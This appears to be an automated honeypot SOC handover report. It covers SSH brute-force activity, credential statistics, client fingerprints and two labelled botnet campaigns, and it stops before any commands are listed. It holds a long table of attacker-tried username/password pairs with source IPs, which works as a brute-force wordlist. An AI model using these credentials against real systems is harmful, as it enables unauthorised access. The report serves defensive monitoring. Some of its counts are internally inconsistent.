# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-25 |
| **Generated At** | 2026-06-25T21:48:43Z |
| **Shift Time** | 21:48 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **668** |
| Confirmed Threats | **648** |
| False Positives Filtered | **20** (3.0%) |
| Unique Attacker IPs | **38** |
| Countries of Origin | **11** |
| High Severity Cases | **339** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **329** |
| Malware Samples Analyzed | **6** HIGH · **36** MED · 5 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **351** |
| Unique Credential Pairs | **320** |
| Unique Usernames | **159** |
| Unique Passwords | **270** |
| Successful Auth Pairs | **328** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 135 |
| `ubuntu` | 21 |
| `admin` | 14 |
| `postgres` | 5 |
| `support` | 4 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 27 |
| `` | 8 |
| `LeitboGi0ro` | 6 |
| `smo@@kkklss` | 6 |
| `123@@@` | 6 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `admin` | `` | 8 |
| `root` | `LeitboGi0ro` | 6 |
| `root` | `smo@@kkklss` | 6 |
| `root` | `123@@@` | 6 |
| `admin` | `admin` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `riot` | `riot` | `209.99.185.59` | 2026-06-25T16:55:25 |
| `yy` | `123456` | `209.99.185.59` | 2026-06-25T16:56:15 |
| `admin` | `admin` | `192.142.28.77` | 2026-06-25T16:56:44 |
| `root` | `root@2020` | `209.99.185.59` | 2026-06-25T16:57:07 |
| `ghost` | `ghost111111` | `209.99.185.59` | 2026-06-25T16:58:01 |
| `web1` | `web123` | `45.198.224.120` | 2026-06-25T16:58:26 |
| `root` | `Preforsa2023*` | `209.99.185.59` | 2026-06-25T16:58:55 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-06-25T16:59:40 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-06-25T16:59:41 |
| `root` | `123@@@` | `129.153.145.135` | 2026-06-25T16:59:42 |
| `root` | `r0ot` | `209.99.185.59` | 2026-06-25T16:59:49 |
| `wangyp` | `wangyp123` | `209.99.185.59` | 2026-06-25T17:00:43 |
| `user5` | `123456` | `209.99.185.59` | 2026-06-25T17:01:37 |
| `postgres` | `654321` | `209.99.185.59` | 2026-06-25T17:02:32 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-06-25T17:03:16 |
| `root` | `123@@@` | `64.110.90.250` | 2026-06-25T17:03:16 |
| `yuhan` | `yuhan123` | `209.99.185.59` | 2026-06-25T17:03:24 |
| `Data` | `korea2018` | `209.99.185.59` | 2026-06-25T17:04:18 |
| `support` | `support` | `51.158.248.122` | 2026-06-25T17:04:35 |
| `ubuntu` | `progres` | `209.99.185.59` | 2026-06-25T17:05:13 |
| `root` | `hosting` | `209.99.185.59` | 2026-06-25T17:06:09 |
| `root` | `123321123` | `209.99.185.59` | 2026-06-25T17:07:04 |
| `loose` | `loose111111` | `209.99.185.59` | 2026-06-25T17:07:58 |
| `root` | `Linux!@2025Root` | `45.205.1.42` | 2026-06-25T17:08:01 |
| `root` | `Abc@1234` | `209.99.185.59` | 2026-06-25T17:08:52 |
| `root` | `Passw0rd44` | `209.99.185.59` | 2026-06-25T17:09:47 |
| `ok` | `123456` | `209.99.185.59` | 2026-06-25T17:10:41 |
| `ubuntu` | `qwer123` | `45.198.224.120` | 2026-06-25T17:10:45 |
| `guest` | `qwerty` | `209.99.185.59` | 2026-06-25T17:11:36 |
| `root` | `@123root` | `209.99.185.59` | 2026-06-25T17:12:32 |
| `root` | `postgres1234567` | `209.99.185.59` | 2026-06-25T17:13:30 |
| `ly` | `ly123` | `209.99.185.59` | 2026-06-25T17:14:25 |
| `site` | `site123` | `209.99.185.59` | 2026-06-25T17:15:18 |
| `eraser` | `eraser` | `209.99.185.59` | 2026-06-25T17:16:12 |
| `guest` | `guest@2021` | `209.99.185.59` | 2026-06-25T17:17:10 |
| `nnm` | `qazwsx12` | `209.99.185.59` | 2026-06-25T17:18:06 |
| `root` | `P@55wOrd` | `209.99.185.59` | 2026-06-25T17:19:01 |
| `shanghaizhongxin` | `123321` | `209.99.185.59` | 2026-06-25T17:19:57 |
| `root` | `Qwer123` | `209.99.185.59` | 2026-06-25T17:20:53 |
| `yuanzhecai` | `yuanzhecai` | `209.99.185.59` | 2026-06-25T17:21:50 |
| `root` | `Pxf123` | `45.205.1.42` | 2026-06-25T17:22:24 |
| `deploy` | `123` | `209.99.185.59` | 2026-06-25T17:22:48 |
| `postgres` | `postgres` | `45.198.224.120` | 2026-06-25T17:22:55 |
| `ubuntu` | `p@ssw0rd` | `209.99.185.59` | 2026-06-25T17:23:42 |
| `polaris` | `1234` | `209.99.185.59` | 2026-06-25T17:24:40 |
| `postgres` | `changeme` | `209.99.185.59` | 2026-06-25T17:25:38 |
| `sunrui` | `sunrui` | `209.99.185.59` | 2026-06-25T17:26:36 |
| `test` | `passwd` | `209.99.185.59` | 2026-06-25T17:27:35 |
| `beetroot` | `beetroot123` | `209.99.185.59` | 2026-06-25T17:28:32 |
| `localadmin` | `1qaz@WSX` | `209.99.185.59` | 2026-06-25T17:29:30 |
| `amax` | `a123456` | `209.99.185.59` | 2026-06-25T17:30:31 |
| `root` | `zxc123` | `209.99.185.59` | 2026-06-25T17:31:32 |
| `nginx` | `123qwe` | `209.99.185.59` | 2026-06-25T17:32:30 |
| `es` | `123qwe` | `209.99.185.59` | 2026-06-25T17:33:28 |
| `root` | `webadmin` | `209.99.185.59` | 2026-06-25T17:34:24 |
| `root` | `ubuntu10vm` | `45.198.224.120` | 2026-06-25T17:34:40 |
| `odoo` | `123` | `209.99.185.59` | 2026-06-25T17:35:21 |
| `ubuntu` | `oracle123` | `209.99.185.59` | 2026-06-25T17:36:21 |
| `debian` | `password` | `45.205.1.42` | 2026-06-25T17:36:45 |
| `gauss` | `gauss` | `209.99.185.59` | 2026-06-25T17:37:22 |
| `ntps` | `tianyong123` | `209.99.185.59` | 2026-06-25T17:38:24 |
| `test` | `test123!@#` | `209.99.185.59` | 2026-06-25T17:39:24 |
| `duskwatch95` | `duskwatch95` | `209.99.185.59` | 2026-06-25T17:40:24 |
| `dhkim` | `1234` | `209.99.185.59` | 2026-06-25T17:41:23 |
| `siml-admin` | `siml-admin` | `209.99.185.59` | 2026-06-25T17:42:24 |
| `root` | `﻿------fuck------` | `10.0.0.73` | 2026-06-25T17:43:19 |
| `siml-adm` | `siml-adm` | `209.99.185.59` | 2026-06-25T17:43:27 |
| `root` | `1qaz@WSX` | `209.99.185.59` | 2026-06-25T17:44:30 |
| `zxc` | `zxc` | `209.99.185.59` | 2026-06-25T17:45:32 |
| `root` | `nektobit@1234` | `209.99.185.59` | 2026-06-25T17:46:33 |
| `root` | `Password0` | `45.198.224.120` | 2026-06-25T17:46:39 |
| `root` | `Password@1` | `209.99.185.59` | 2026-06-25T17:47:34 |
| `ubuntu` | `dev1234` | `209.99.185.59` | 2026-06-25T17:48:35 |
| `ling` | `123456` | `209.99.185.59` | 2026-06-25T17:49:38 |
| `pi` | `1234` | `209.99.185.59` | 2026-06-25T17:50:42 |
| `root` | `P@ssw0rd$$icd` | `45.205.1.42` | 2026-06-25T17:51:25 |
| `admin` | `peribit` | `209.99.185.59` | 2026-06-25T17:51:44 |
| `forum` | `forum` | `209.99.185.59` | 2026-06-25T17:52:47 |
| `app` | `app123` | `209.99.185.59` | 2026-06-25T17:53:50 |
| `yikan` | `1q2w3e` | `209.99.185.59` | 2026-06-25T17:54:54 |
| `root` | `Pass@word!123` | `209.99.185.59` | 2026-06-25T17:55:58 |
| `gaohan` | `gaohan123` | `209.99.185.59` | 2026-06-25T17:57:04 |
| `root` | `Password456` | `45.198.224.120` | 2026-06-25T17:58:08 |
| `jry22` | `jiangruiyang2000` | `209.99.185.59` | 2026-06-25T17:58:09 |
| `openhabian` | `openhabian` | `209.99.185.59` | 2026-06-25T17:59:13 |
| `root` | `!root` | `91.92.40.13` | 2026-06-25T17:59:41 |
| `root` | `qweASD123` | `209.99.185.59` | 2026-06-25T18:00:16 |
| `root` | `%oL3ownX8` | `209.99.185.59` | 2026-06-25T18:00:57 |
| `root` | `Pass@word!@#` | `209.99.185.59` | 2026-06-25T18:01:39 |
| `root` | `!123qwe` | `209.99.185.59` | 2026-06-25T18:02:22 |
| `root` | `aaa123!!!` | `209.99.185.59` | 2026-06-25T18:03:05 |
| `root` | `QWERT!@#$%` | `209.99.185.59` | 2026-06-25T18:03:48 |
| `ads` | `ads` | `209.99.185.59` | 2026-06-25T18:04:31 |
| `caja4` | `caja4` | `209.99.185.59` | 2026-06-25T18:05:14 |
| `tomcat` | `qwer` | `209.99.185.59` | 2026-06-25T18:05:56 |
| `ubuntu` | `123qwe!@#` | `45.205.1.42` | 2026-06-25T18:06:12 |
| `meihui` | `123456` | `209.99.185.59` | 2026-06-25T18:06:39 |
| `gofiber` | `gofiber` | `209.99.185.59` | 2026-06-25T18:07:22 |
| `school` | `123456` | `209.99.185.59` | 2026-06-25T18:08:06 |
| `bkippbx` | `123456` | `209.99.185.59` | 2026-06-25T18:08:51 |
| `njzt` | `123456` | `209.99.185.59` | 2026-06-25T18:09:37 |
| `root` | `pentruspaniolu` | `45.198.224.120` | 2026-06-25T18:09:41 |
| `chenxi` | `Neochen1228` | `209.99.185.59` | 2026-06-25T18:10:22 |
| `jiequan` | `jiequan` | `209.99.185.59` | 2026-06-25T18:11:07 |
| `xuzhao` | `632145201203` | `209.99.185.59` | 2026-06-25T18:11:52 |
| `oracle` | `123@abc` | `209.99.185.59` | 2026-06-25T18:12:36 |
| `dell` | `dell@333` | `209.99.185.59` | 2026-06-25T18:13:20 |
| `root` | `1test` | `209.99.185.59` | 2026-06-25T18:14:03 |
| `root` | `Admin#W0rld` | `209.99.185.59` | 2026-06-25T18:14:49 |
| `root` | `QWE@asd123.` | `209.99.185.59` | 2026-06-25T18:15:35 |
| `testing` | `1234567` | `209.99.185.59` | 2026-06-25T18:16:21 |
| `dachuang` | `dachuang` | `209.99.185.59` | 2026-06-25T18:17:06 |
| `hadoop` | `123456` | `209.99.185.59` | 2026-06-25T18:17:51 |
| `student4` | `123456` | `209.99.185.59` | 2026-06-25T18:18:35 |
| `root` | `@WSX1qaz123` | `209.99.185.59` | 2026-06-25T18:19:19 |
| `root` | `demo1234567890` | `209.99.185.59` | 2026-06-25T18:20:03 |
| `testuser` | `test123` | `209.99.185.59` | 2026-06-25T18:20:51 |
| `info` | `informix` | `45.205.1.42` | 2026-06-25T18:20:53 |
| `root` | `godzilla` | `45.198.224.120` | 2026-06-25T18:21:23 |
| `root` | `id` | `209.99.185.59` | 2026-06-25T18:21:43 |
| `root` | `123@@@` | `144.22.238.238` | 2026-06-25T18:22:10 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-06-25T18:22:11 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-06-25T18:22:21 |
| `gbase` | `123456` | `209.99.185.59` | 2026-06-25T18:22:35 |
| `magento` | `magento` | `209.99.185.59` | 2026-06-25T18:23:23 |
| `root` | `pass$123` | `209.99.185.59` | 2026-06-25T18:24:06 |
| `root` | `@1Dumitru` | `209.99.185.59` | 2026-06-25T18:24:50 |
| `yuanwd` | `pass123` | `209.99.185.59` | 2026-06-25T18:25:36 |
| `fanyixing` | `fanyixing` | `209.99.185.59` | 2026-06-25T18:26:24 |
| `ps` | `ps` | `209.99.185.59` | 2026-06-25T18:27:10 |
| `root` | `admin12345` | `209.99.185.59` | 2026-06-25T18:27:57 |
| `liuyumeng` | `liuyumeng` | `209.99.185.59` | 2026-06-25T18:28:45 |
| `root` | `kingsoft` | `209.99.185.59` | 2026-06-25T18:29:32 |
| `root` | `admin1qaz2wsx` | `209.99.185.59` | 2026-06-25T18:30:18 |
| `wx` | `wuxia` | `209.99.185.59` | 2026-06-25T18:31:05 |
| `root` | `harley` | `209.99.185.59` | 2026-06-25T18:31:56 |
| `yslxk` | `yslxk` | `209.99.185.59` | 2026-06-25T18:32:43 |
| `public` | `public` | `45.198.224.120` | 2026-06-25T18:32:48 |
| `nagios` | `test321` | `209.99.185.59` | 2026-06-25T18:33:29 |
| `kj` | `kj` | `209.99.185.59` | 2026-06-25T18:34:17 |
| `lcp` | `chuanpu527` | `209.99.185.59` | 2026-06-25T18:35:05 |
| `liweixiao` | `liweixiao` | `45.205.1.42` | 2026-06-25T18:35:44 |
| `root` | `Pass_Word` | `209.99.185.59` | 2026-06-25T18:35:52 |
| `lyt` | `123456` | `209.99.185.59` | 2026-06-25T18:36:39 |
| `root` | `r00t` | `209.99.185.59` | 2026-06-25T18:37:26 |
| `root` | `Pa$$w0rd@12345` | `209.99.185.59` | 2026-06-25T18:38:11 |
| `mysql` | `passwd` | `209.99.185.59` | 2026-06-25T18:38:57 |
| `jly` | `123456` | `209.99.185.59` | 2026-06-25T18:39:44 |
| `root` | `sc123` | `209.99.185.59` | 2026-06-25T18:40:33 |
| `root` | `qwertz123` | `209.99.185.59` | 2026-06-25T18:41:22 |
| `ubuntu` | `pass12345678` | `209.99.185.59` | 2026-06-25T18:42:11 |
| `root` | `postgres123456` | `209.99.185.59` | 2026-06-25T18:42:59 |
| `deploy` | `12345` | `209.99.185.59` | 2026-06-25T18:43:47 |
| `root` | `Pa$sw0rd!` | `45.198.224.120` | 2026-06-25T18:44:18 |
| `lamps` | `123456` | `209.99.185.59` | 2026-06-25T18:44:37 |
| `iexcel001` | `iexcel001111111` | `209.99.185.59` | 2026-06-25T18:45:31 |
| `ubuntu` | `QAWSEDRF` | `209.99.185.59` | 2026-06-25T18:46:21 |
| `root` | `w3lc0m3` | `209.99.185.59` | 2026-06-25T18:47:12 |
| `postgres` | `passwd` | `209.99.185.59` | 2026-06-25T18:48:03 |
| `dmdba` | `abc123` | `209.99.185.59` | 2026-06-25T18:48:53 |
| `git` | `Git@123` | `209.99.185.59` | 2026-06-25T18:49:43 |
| `root` | `Aa102030` | `45.205.1.42` | 2026-06-25T18:50:26 |
| `bao` | `123456` | `209.99.185.59` | 2026-06-25T18:50:33 |
| `root` | `qishangzaixian` | `209.99.185.59` | 2026-06-25T18:51:23 |
| `ubuntu` | `abcd12` | `209.99.185.59` | 2026-06-25T18:52:15 |
| `root` | `810521` | `209.99.185.59` | 2026-06-25T18:53:07 |
| `yfq` | `123` | `209.99.185.59` | 2026-06-25T18:54:00 |
| `root` | `asd12345678` | `209.99.185.59` | 2026-06-25T18:54:52 |
| `apache` | `111111` | `209.99.185.59` | 2026-06-25T18:55:44 |
| `root` | `Pass@word1` | `45.198.224.120` | 2026-06-25T18:55:45 |
| `root` | `apache123` | `209.99.185.59` | 2026-06-25T18:56:33 |
| `root` | `Qwert!234` | `209.99.185.59` | 2026-06-25T18:57:23 |
| `namz1` | `1234` | `209.99.185.59` | 2026-06-25T18:58:13 |
| `root` | `H2zJ2aHU` | `209.99.185.59` | 2026-06-25T18:59:05 |
| `root` | `2wsx4rfv%TGB` | `209.99.185.59` | 2026-06-25T18:59:58 |
| `user` | `rl_2021win` | `209.99.185.59` | 2026-06-25T19:00:50 |
| `root` | `fK5)82wF5,}~)sS{` | `209.99.185.59` | 2026-06-25T19:01:44 |
| `root` | `1qa2ws` | `209.99.185.59` | 2026-06-25T19:02:37 |
| `root` | `1qaz@WSX3edc$RFV` | `209.99.185.59` | 2026-06-25T19:03:28 |
| `root` | `sophie` | `209.99.185.59` | 2026-06-25T19:04:20 |
| `root` | `william` | `45.205.1.42` | 2026-06-25T19:05:05 |
| `root` | `demo` | `209.99.185.59` | 2026-06-25T19:05:13 |
| `airchem` | `korea2014` | `209.99.185.59` | 2026-06-25T19:06:06 |
| `root` | `root00` | `45.198.224.120` | 2026-06-25T19:06:52 |
| `cas` | `cas` | `209.99.185.59` | 2026-06-25T19:07:01 |
| `rf` | `123456` | `209.99.185.59` | 2026-06-25T19:07:56 |
| `ubuntu` | `q1` | `209.99.185.59` | 2026-06-25T19:08:52 |
| `root` | `Highgoal123` | `209.99.185.59` | 2026-06-25T19:09:47 |
| `devops` | `123qwe` | `209.99.185.59` | 2026-06-25T19:10:46 |
| `mycat` | `mycat` | `209.99.185.59` | 2026-06-25T19:11:48 |
| `root` | `123asd!@#` | `209.99.185.59` | 2026-06-25T19:12:48 |
| `zhiyuan` | `eZBV7W0jN7` | `209.99.185.59` | 2026-06-25T19:13:49 |
| `manish` | `manish` | `209.99.185.59` | 2026-06-25T19:14:46 |
| `root` | `zxcvbn` | `209.99.185.59` | 2026-06-25T19:15:47 |
| `cyrus` | `cyrus321` | `209.99.185.59` | 2026-06-25T19:16:42 |
| `hyh` | `123456` | `209.99.185.59` | 2026-06-25T19:17:38 |
| `ubuntu` | `abcd12` | `45.198.224.120` | 2026-06-25T19:18:13 |
| `dingy` | `dingy1234` | `209.99.185.59` | 2026-06-25T19:18:36 |
| `ubuntu` | `hduser1234567` | `209.99.185.59` | 2026-06-25T19:19:34 |
| `root` | `qazWER)(*` | `45.205.1.42` | 2026-06-25T19:19:43 |
| `root` | `n0acc3ss` | `209.99.185.59` | 2026-06-25T19:20:31 |
| `yichao` | `123456` | `209.99.185.59` | 2026-06-25T19:21:27 |
| `root` | `123456aA` | `209.99.185.59` | 2026-06-25T19:22:23 |
| `invens2` | `invens2` | `209.99.185.59` | 2026-06-25T19:23:18 |
| `zxy` | `root` | `209.99.185.59` | 2026-06-25T19:24:15 |
| `root` | `)(*` | `209.99.185.59` | 2026-06-25T19:25:12 |
| `qc` | `1234` | `209.99.185.59` | 2026-06-25T19:26:10 |
| `yuanwd` | `test` | `209.99.185.59` | 2026-06-25T19:27:06 |
| `root` | `5tgb6yhn` | `209.99.185.59` | 2026-06-25T19:28:04 |
| `zjj` | `zjj123456` | `209.99.185.59` | 2026-06-25T19:29:02 |
| `root` | `P@ssword1234` | `45.198.224.120` | 2026-06-25T19:29:27 |
| `cxs` | `123456` | `209.99.185.59` | 2026-06-25T19:30:01 |
| `kafka` | `test` | `209.99.185.59` | 2026-06-25T19:31:01 |
| `service` | `123456` | `209.99.185.59` | 2026-06-25T19:32:02 |
| `monkey` | `monkey` | `209.99.185.59` | 2026-06-25T19:33:03 |
| `postgres` | `passpass` | `209.99.185.59` | 2026-06-25T19:34:02 |
| `ubuntu` | `qwe123!!` | `45.205.1.42` | 2026-06-25T19:34:22 |
| `oracle` | `ABCabc123!` | `209.99.185.59` | 2026-06-25T19:35:01 |
| `root` | `z1x2c3v4` | `209.99.185.59` | 2026-06-25T19:36:00 |
| `sunyuhao` | `dox012` | `209.99.185.59` | 2026-06-25T19:37:01 |
| `meklis` | `333333` | `209.99.185.59` | 2026-06-25T19:38:02 |
| `user` | `4444` | `209.99.185.59` | 2026-06-25T19:39:03 |
| `hall` | `123456` | `209.99.185.59` | 2026-06-25T19:40:04 |
| `root` | `PASSWORD!@#` | `45.198.224.120` | 2026-06-25T19:40:55 |
| `test2` | `1` | `209.99.185.59` | 2026-06-25T19:41:05 |
| `heyingtong` | `Q123qaz` | `209.99.185.59` | 2026-06-25T19:42:07 |
| `airchem` | `korea2017` | `209.99.185.59` | 2026-06-25T19:43:09 |
| `root` | `Admin@2024@!` | `209.99.185.59` | 2026-06-25T19:44:14 |
| `root` | `blabla123x!!!` | `209.99.185.59` | 2026-06-25T19:45:18 |
| `inukj` | `dlsnrl82` | `209.99.185.59` | 2026-06-25T19:46:21 |
| `lby` | `lby` | `209.99.185.59` | 2026-06-25T19:47:23 |
| `guest` | `qwe123` | `209.99.185.59` | 2026-06-25T19:48:25 |
| `root` | `QWER!@#$` | `45.205.1.42` | 2026-06-25T19:48:59 |
| `root` | `sugon;123` | `209.99.185.59` | 2026-06-25T19:49:35 |
| `liuyancheng` | `liuyancheng` | `209.99.185.59` | 2026-06-25T19:50:39 |
| `root` | `lauren` | `209.99.185.59` | 2026-06-25T19:51:42 |
| `tomcat8` | `tomcat8` | `209.99.185.59` | 2026-06-25T19:52:45 |
| `root` | `test12346` | `45.198.224.120` | 2026-06-25T19:52:53 |
| `myjeon` | `1234` | `209.99.185.59` | 2026-06-25T19:53:47 |
| `elasticsearch` | `123456` | `209.99.185.59` | 2026-06-25T19:54:50 |
| `ubuntu` | `Passwd1` | `209.99.185.59` | 2026-06-25T19:55:54 |
| `root` | `)(*&` | `209.99.185.59` | 2026-06-25T19:57:00 |
| `root` | `linux2010` | `209.99.185.59` | 2026-06-25T19:58:07 |
| `huawei` | `123456` | `209.99.185.59` | 2026-06-25T19:59:12 |
| `root` | `ZnHb@!23456` | `209.99.185.59` | 2026-06-25T20:00:16 |
| `wx` | `wx1315920810` | `209.99.185.59` | 2026-06-25T20:00:56 |
| `tianjin` | `tianjin123` | `209.99.185.59` | 2026-06-25T20:01:37 |
| `root` | `P4ssw0rd` | `209.99.185.59` | 2026-06-25T20:02:18 |
| `kdk` | `123456` | `209.99.185.59` | 2026-06-25T20:03:01 |
| `root` | `Oracle12#$` | `45.205.1.42` | 2026-06-25T20:03:39 |
| `wpyan` | `1q2w3e` | `209.99.185.59` | 2026-06-25T20:03:43 |
| `localadmin` | `123` | `209.99.185.59` | 2026-06-25T20:04:26 |
| `root` | `Password#123456` | `45.198.224.120` | 2026-06-25T20:04:55 |
| `mysql` | `test123` | `209.99.185.59` | 2026-06-25T20:05:09 |
| `gpu` | `12` | `209.99.185.59` | 2026-06-25T20:05:50 |
| `root` | `qhdidc@` | `209.99.185.59` | 2026-06-25T20:06:31 |
| `chao` | `chao123` | `209.99.185.59` | 2026-06-25T20:07:12 |
| `xoutils` | `xoutils` | `209.99.185.59` | 2026-06-25T20:07:54 |
| `hyx` | `hyx` | `209.99.185.59` | 2026-06-25T20:08:36 |
| `ansible` | `1234567` | `209.99.185.59` | 2026-06-25T20:09:19 |
| `wzy` | `zhaoyan` | `209.99.185.59` | 2026-06-25T20:10:02 |
| `root` | `adminadminadmin` | `209.99.185.59` | 2026-06-25T20:10:45 |
| `root` | `c0v.c0v.1.1` | `209.99.185.59` | 2026-06-25T20:11:28 |
| `testing` | `123456` | `209.99.185.59` | 2026-06-25T20:12:10 |
| `tav` | `OctavianValentin123456@` | `209.99.185.59` | 2026-06-25T20:12:52 |
| `prova` | `prova` | `209.99.185.59` | 2026-06-25T20:13:35 |
| `root` | `2224` | `209.99.185.59` | 2026-06-25T20:14:19 |
| `work02` | `123456` | `209.99.185.59` | 2026-06-25T20:15:03 |
| `omnisky` | `wA.*Kuang-Qs` | `209.99.185.59` | 2026-06-25T20:15:47 |
| `isouser` | `isouser` | `209.99.185.59` | 2026-06-25T20:16:31 |
| `root` | `qpoeiruty` | `45.198.224.120` | 2026-06-25T20:17:10 |
| `xbmc` | `xbmc` | `209.99.185.59` | 2026-06-25T20:17:16 |
| `ubuntu` | `lol123` | `209.99.185.59` | 2026-06-25T20:18:01 |
| `ubuntu` | `passwort` | `45.205.1.42` | 2026-06-25T20:18:36 |
| `root` | `nologin` | `209.99.185.59` | 2026-06-25T20:18:45 |
| `root` | `qishang2017.com` | `209.99.185.59` | 2026-06-25T20:19:29 |
| `test1` | `test` | `209.99.185.59` | 2026-06-25T20:20:14 |
| `root` | `admin@321` | `209.99.185.59` | 2026-06-25T20:20:59 |
| `xzy` | `xzy594953` | `209.99.185.59` | 2026-06-25T20:21:44 |
| `helong` | `helong` | `209.99.185.59` | 2026-06-25T20:22:30 |
| `root` | `passw0rd01` | `209.99.185.59` | 2026-06-25T20:23:16 |
| `www-data` | `www-server` | `209.99.185.59` | 2026-06-25T20:24:02 |
| `mysql` | `mysql2022` | `209.99.185.59` | 2026-06-25T20:24:48 |
| `licheng` | `123456` | `209.99.185.59` | 2026-06-25T20:25:33 |
| `test` | `hduser123456789` | `209.99.185.59` | 2026-06-25T20:26:19 |
| `ubuntu` | `abcd1234567` | `209.99.185.59` | 2026-06-25T20:27:06 |
| `ubuntu` | `q1w2e3r4t5y` | `209.99.185.59` | 2026-06-25T20:27:53 |
| `root` | `Passw@rd` | `209.99.185.59` | 2026-06-25T20:28:41 |
| `root` | `monkey` | `45.198.224.120` | 2026-06-25T20:28:47 |
| `oracle` | `asdasd` | `209.99.185.59` | 2026-06-25T20:29:29 |
| `market` | `market` | `209.99.185.59` | 2026-06-25T20:30:17 |
| `root` | `Stefan20xxl21` | `209.99.185.59` | 2026-06-25T20:31:06 |
| `junhui` | `1` | `209.99.185.59` | 2026-06-25T20:31:53 |
| `root` | `000999` | `209.99.185.59` | 2026-06-25T20:32:41 |
| `root` | `P@ssword#123` | `45.205.1.42` | 2026-06-25T20:33:00 |
| `mglee` | `mglee` | `209.99.185.59` | 2026-06-25T20:33:31 |
| `dell` | `admin@2015` | `209.99.185.59` | 2026-06-25T20:34:25 |
| `root` | `jj` | `209.99.185.59` | 2026-06-25T20:35:17 |
| `admin` | `admin` | `45.148.10.121` | 2026-06-25T20:35:22 |
| `root` | `qwe1234%^` | `209.99.185.59` | 2026-06-25T20:36:12 |
| `root` | `root01` | `209.99.185.59` | 2026-06-25T20:37:04 |
| `root` | `---fuck_you----` | `210.16.177.90` | 2026-06-25T20:37:20 |
| `hik` | `hik` | `209.99.185.59` | 2026-06-25T20:37:53 |
| `root` | `root!@#` | `209.99.185.59` | 2026-06-25T20:38:42 |
| `zhouh` | `111111` | `209.99.185.59` | 2026-06-25T20:39:30 |
| `yaozhenyu` | `yaozhenyu` | `209.99.185.59` | 2026-06-25T20:40:20 |
| `zengke` | `zengke` | `45.198.224.120` | 2026-06-25T20:40:25 |
| `yzr` | `Fh3.1416` | `209.99.185.59` | 2026-06-25T20:41:11 |
| `admin` | `admin` | `10.0.0.73` | 2026-06-25T20:41:58 |
| `bin` | `bin` | `209.99.185.59` | 2026-06-25T20:42:03 |
| `root` | `hitcamron1111` | `209.99.185.59` | 2026-06-25T20:42:56 |
| `debian` | `debian123` | `209.99.185.59` | 2026-06-25T20:43:46 |
| `root` | `qwe123456` | `209.99.185.59` | 2026-06-25T20:44:36 |
| `jira` | `321123` | `209.99.185.59` | 2026-06-25T20:45:25 |
| `root` | `---fuck_you----` | `10.0.0.73` | 2026-06-25T20:46:00 |
| `root` | `66666` | `209.99.185.59` | 2026-06-25T20:46:16 |
| `huwentao` | `huwentao` | `209.99.185.59` | 2026-06-25T20:47:08 |
| `ubuntu` | `qazw1234` | `45.205.1.42` | 2026-06-25T20:47:17 |
| `zhouh` | `test` | `209.99.185.59` | 2026-06-25T20:48:00 |
| `root` | `aa123123` | `209.99.185.59` | 2026-06-25T20:48:54 |
| `root` | `3wkdgh34` | `209.99.185.59` | 2026-06-25T20:49:46 |
| `ubuntu` | `qwas12` | `209.99.185.59` | 2026-06-25T20:50:39 |
| `web` | `123` | `209.99.185.59` | 2026-06-25T20:51:30 |
| `ubuntu` | `q1w2e3r4t5y6u` | `45.198.224.120` | 2026-06-25T20:52:10 |
| `mkonnuri16` | `mkonnuri16` | `209.99.185.59` | 2026-06-25T20:52:22 |
| `lyw` | `123` | `209.99.185.59` | 2026-06-25T20:53:15 |
| `amandabackup` | `0` | `209.99.185.59` | 2026-06-25T20:54:07 |
| `jzj` | `jzj` | `209.99.185.59` | 2026-06-25T20:55:01 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **668** |
| Sessions with Fingerprint | **13** |
| Unique HASSH Fingerprints | **13** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 322 |
| Paramiko (Python) | 18 |
| libssh | 18 |
| Unknown | 2 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `16443846184e...` | Generic scanner | 312 | 3 |
| `a2de0f306611...` | Mirai/variant | 18 | 3 |
| `f1e5e9d24e5e...` | Mirai/variant | 4 | 1 |
| `dd9bcf093c35...` | Mirai/variant | 2 | 2 |
| `bf7dbf67fa9b...` | Mirai/variant | 2 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `16443846184e...` | Go SSH scanner | 312 | 3 | Generic scanner |
| `a2de0f306611...` | Paramiko (Python) | 18 | 3 | Mirai/variant |
| `95420f9d932d...` | libssh | 17 | 6 | — |
| `f1e5e9d24e5e...` | Go SSH scanner | 4 | 1 | Mirai/variant |
| `dd9bcf093c35...` | Unknown | 2 | 2 | Mirai/variant |
| `bf7dbf67fa9b...` | Go SSH scanner | 2 | 1 | Mirai/variant |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **7** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1059.004, T1082, T1592` |
| **Recon Loader Script** | 🟡 MEDIUM | 1 | 1 | `T1082, T1592, T1078, T1083` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
